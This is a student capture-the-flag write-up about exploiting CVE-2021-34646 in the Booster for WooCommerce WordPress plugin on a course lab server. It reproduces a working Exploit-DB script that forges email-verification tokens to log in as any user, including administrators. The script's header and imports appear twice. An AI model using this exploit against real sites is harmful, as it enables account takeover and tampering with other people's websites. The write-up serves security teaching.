# Work done in week #3

## CTF - Week 3

Sanity Check: The flag was on the rules as stated.

Challenge 1:
1. We accessed the provided URL and explored the products being sold.
2. We found a product with a comment reporting security issues.
3. We checked the versions of WordPress and plugins for the product.
4. We noticed a footer message stating that the seller uses the same plugins and WordPress.
5. We searched for CVEs (Common Vulnerabilities and Exposures) corresponding to the collected information.
6. We found 2 possible candidates, and one of them was correct.

Challenge 2:
1. We used the provided exploit at https://www.exploit-db.com/exploits/50299.
2. Initially, we encountered issues trying to run the file without the correct permissions and with the wrong Python version.
3. When accessing the address provided http://ctf-fsi.fe.up.pt:5001/wp-json/wp/v2/users/1 (being 1 the user id) by the exploiter, we verify that the id belongs to the admin
4. We executed the exploit with the target's URL and ID 1.
5. We obtained 3 possible URLs, and one of them granted us administrator privileges.
6. We accessed the provided posts section at http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php.
7. In an admin post, we found the flag.


**Exploit:**

```python
# Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
# Date: 2021-09-16
# Exploit Author: Sebastian Kriesten (0xB455)
# Contact: https://twitter.com/0xB455
#
# Affected Plugin: Booster for WooCommerce
# Plugin Slug: woocommerce-jetpack
# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
# Affected Versions: <= 5.4.3
# Fully Patched Version: >= 5.4.4
# CVE: CVE-2021-34646
# CVSS Score: 9.8 (Critical)
# Category: webapps
#
# 1:
# Goto: https://target.com/wp-json/wp/v2/users/
# Pick a user-ID (e.g. 1 - usualy is the admin)
#
# 2:
# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
#
# 3:
# Check-Out  out which of the generated links allows you to access the system
#
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64  # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
# Date: 2021-09-16
# Exploit Author: Sebastian Kriesten (0xB455)
# Contact: https://twitter.com/0xB455
#
# Affected Plugin: Booster for WooCommerce
# Plugin Slug: woocommerce-jetpack
# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
# Affected Versions: <= 5.4.3
# Fully Patched Version: >= 5.4.4
# CVE: CVE-2021-34646
# CVSS Score: 9.8 (Critical)
# Category: webapps
#
# 1:
# Goto: https://target.com/wp-json/wp/v2/users/
# Pick a user-ID (e.g. 1 - usualy is the admin)
#
# 2:
# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
#
# 3:
# Check-Out  out which of the generated links allows you to access the system
#
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/": # URL needs trailing /
      url = url + "/"

verify_url= url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
      print("status code != 200")
      print(r.headers)
      sys.exit(-1)

def email_time_to_timestamp(s):
  tt = email.utils.parsedate_tz(s)
  if tt is None: return None
  return calendar.timegm(tt) - tt[9]

date = r.headers["Date"]
unix = email_time_to_timestamp(date)

def printBanner():
  print(f"{W}Timestamp: {B}" + date)
  print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
  print("We need to generate multiple timestamps in order to avoid delay related timing errors")
  print("One of the following links will log you in...\n")

printBanner()

for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
      hash = hashlib.md5(str(unix-i).encode()).hexdigest()
      print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
      token='{"id":"'+ id +'","code":"'+hash+'"}'
      token = base64.b64encode(token.encode()).decode()
      token = token.rstrip("=") # remove trailing =
      link = url+"my-account/?wcj_verify_email="+token
      print(link + f"\n{RST}")
```

## Identification

- CVE-2021-34646 - WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass (https://www.exploit-db.com/exploits/50299)

- This vulnerability allows remote attackers to bypass authentication and act as other users. The WooCommerce Booster Plugin has a weak random token generation in the reset_and_mail_activation_link function found in the ~/includes/class-wcj-emails-verification.php file. Attackers can easily generate a token that, when used with the process_email_verification function, allows the impersonation of users, including administrators. This vulnerability requires the "Email Verification" module and the "Login User After Successful Verification" setting to be enabled, which it is by default.

- Affected systems:
    - WordPress Plugin WooCommerce Booster Plugin 5.4.3

## Catalogue

- This exploit garnered an exceptionally high CVSS score of 9.8 out of 10, signifying its extreme criticality.

## Exploit

The exploit used by us was found in the following url: https://www.exploit-db.com/exploits/50299

It's a python script that takes a URL and a user ID as parameters. It, then, generates possible email verification tokens for that user, through the known weak token generation method. Finaly, it creates various URLs with those tokens, of which, one of them can authenticate the attacker as the user for the given URL.

## Atacks

When gaining access to the website as an admin, we found that the attacker can edit the contents he would like such as the home page:
